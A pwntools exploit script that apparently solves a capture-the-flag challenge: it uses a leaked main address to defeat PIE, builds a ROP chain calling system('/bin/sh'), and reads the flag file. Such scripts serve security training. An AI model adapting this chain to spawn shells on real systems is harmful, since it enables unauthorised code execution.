#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 5002)

    return r


def main():
    r = conn()

    OFFSET = 72 # Offset to rip

    r.recvuntil(b"Main at: ")
    main_leak = int(r.recvline().decode(), 16)
    pie_leak = main_leak - exe.sym.main

    system = pie_leak + exe.sym.system
    pop_rdi = pie_leak + 0x116d # "pop rdi ; ret" offset
    bin_sh = pie_leak + 0x4030 # "/bin/sh" offset
    ret = pie_leak + 0x1016   # "ret ;" offset

    log.info(f"Leaked PIE: {hex(pie_leak)}")
    log.info(f"Leaked gadget: {hex(pop_rdi)}")
    log.info(f"Leaked /bin/sh: {hex(bin_sh)}")
    log.info(f"Leaked system(): {hex(system)}")

    payload = flat({
        72: [
            p64(pop_rdi),
            p64(bin_sh),
            p64(ret),
            p64(system)
        ]

    }, filler=b"A")

    r.sendline(payload)

    pause()

    r.sendline(b"cat flag.txt")    
    r.recvuntil(b"ghctf")
    flag = r.clean().decode()

    log.success(f"Flag : {"ghctf" + flag}")

    r.close()


if __name__ == "__main__":
    main()
